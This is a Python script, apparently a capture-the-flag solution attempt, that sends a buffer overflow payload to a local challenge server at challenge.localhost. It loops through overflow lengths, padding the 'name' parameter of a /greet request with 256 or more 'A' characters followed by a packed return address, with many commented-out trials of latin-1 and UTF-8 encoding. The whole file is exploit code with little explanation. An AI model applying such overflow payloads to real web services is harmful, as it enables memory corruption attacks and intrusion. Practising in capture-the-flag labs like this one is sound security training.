import requests
import json
import urllib.parse
import sys
import requests
from pwn import *

numberToPack = int(0x00007fcb853e41c5)
magicString = p64(numberToPack, "little", "unsigned")

# Assume `requests` is used for making HTTP requests
import requests

addr = bytes([0xc5, 0x61, 0x1b, 0x38, 0x08, 0x7f, 0x00, 0x00])
#latin1_string = original_bytes.decode('latin-1')
#utf8_encoded = latin1_string.encode('utf-8')


#gandalfString = "http://challenge.localhost/greet?name=".encode("latin") + ("A"*(256)).encode("latin") + addr + ("A"*(8))
#archmageString = gandalfString.decode("latin").encode("utf-8")
#archmageString = archmageString.decode("utf-8")
#archmageString = archmageString.encode("latin")
#print(archmageString.hex())
#gandalfString = "http://challenge.localhost/greet?name=".encode("latin") + ("A"*(256)).encode("latin") + addr
#archmageString = gandalfString.decode("latin").encode("utf-8")
#archmageString = archmageString.decode("utf-8")
#archmageString = archmageString.encode("latin")
#print(archmageString.hex())
#archmageString = magicString.decode("utf-8")
#print(archmageString.hex())
#archmageString = str(archmageString).encode("latin")
#print(archmageString.hex())

#print(gandalfString)
print(magicString)
magicString = magicString.decode("latin")
magicString = magicString.encode("latin")

for i in range(40):

    gandalfString = "http://challenge.localhost/greet?name=".encode("latin") + ("A"*(256+i)).encode("latin") + magicString
    archmageString = gandalfString.decode("latin").encode("utf-8")

    url = archmageString
    r = requests.get(url)
    #print(r.text.encode("latin").hex())
    print(r.text)
